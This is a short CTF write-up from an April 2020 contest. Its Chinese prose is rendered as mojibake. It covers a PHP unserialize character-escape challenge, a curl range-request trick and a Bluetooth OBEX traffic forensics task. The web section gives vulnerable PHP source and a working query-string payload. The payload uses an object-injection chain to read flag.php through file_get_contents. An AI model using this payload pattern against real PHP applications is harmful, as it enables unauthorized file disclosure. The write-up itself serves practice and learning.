---
title: å®‰æ’2020å››æœˆèµ›
date: 2020-04-25
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---
# å®‰æ’2020å››æœˆèµ›

åªä¼šåšåšç®€å•é¢˜æ··æ··åˆ†ğŸ˜¢

<!-- more -->

## web1

```
<?php

show_source("index.php");
function write ($data) {
	return str_replace(chr(0) . '*' . chr(0), '\0\0\0', $data);
}

function read ($data) {
	return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}

class A {
	public $username;
	public $password;

	function __construct ($a, $b) {
		$this->username = $a;
		$this->password = $b;
	}
}

class B {
	public $b ="gpy";
	function __destruct () {
		$c = 'a' . $this->b;
		echo $c;
	}
}

class C {
	public $c;

	function __toString () {
		//flag.php
		echo file_get_contents($this->c);
		return 'nice';
	}
}
$a = new A($_GET['a'],$_GET['b']);
$b = unserialize(read(write(serialize($a))));
function read ($data) {
	return str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
}
```

readå‡½æ•°å°†`chr(0) . '*' . chr(0)`å˜ä¸º`\0\0\0`,ä½†æ˜¯å‰è€…åªæœ‰ä¸‰ä¸ªå­—ç¬¦,åè€…æœ‰å…­ä¸ªå­—ç¬¦,é‚£ä¹ˆå°±ä¼šå¯¼è‡´å­—ç¬¦é€ƒé€¸ã€‚

**payload**

```
?a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&b=;s:";s:8:"password";O:1:"B":1:{s:1:"b";O:1:"C":1:{s:1:"c";s:8:"flag.php";}}}
```

## MISC

### 6Gç­¾åˆ°

```
curl --range 0-100 http://balabala/1Gfile.file
```

### MISC1

ä¸‹è½½æ˜¯ä¸ªæµé‡åŒ…

ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæ˜¯è“ç‰™çš„æµé‡ã€‚

å…ˆæŒ‰åè®®æ’ä¸€ä¸‹åº

[![mark](https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim)](https://blogjpg.yanmy.top/blog/20200425/GegNB3OYmHCW.png?imageslim)

æ‰¾è“ç‰™çš„ä¼ è¾“åè®®OBEX

[![mark](https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim)](https://blogjpg.yanmy.top/blog/20200425/UgRLRbitaEmw.png?imageslim)

æŠŠ7zå‹ç¼©åŒ…çš„æ•°æ®å—å¤åˆ¶å‡ºæ¥ï¼Œç”¨winhexæˆ–è€…010editorä¿å­˜æˆ7zæ–‡ä»¶ï¼Œè§£å‹ï¼Œè¦PIN

[![mark](https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim)](https://blogjpg.yanmy.top/blog/20200425/0LBErJCiGVVb.png?imageslim)

å»æ‰è¿‡æ»¤å™¨ï¼Œ`ctrl+f`æŸ¥æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰PINï¼Œå‘ç°æœ‰çš„ï¼Œè§£å‹å¾—åˆ°flag

[![mark](https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim)](https://blogjpg.yanmy.top/blog/20200425/PrkpItBPzngw.png?imageslim)

[![mark](https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim)](https://blogjpg.yanmy.top/blog/20200425/iWTFkcKX62gx.png?imageslim)

**å¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Š**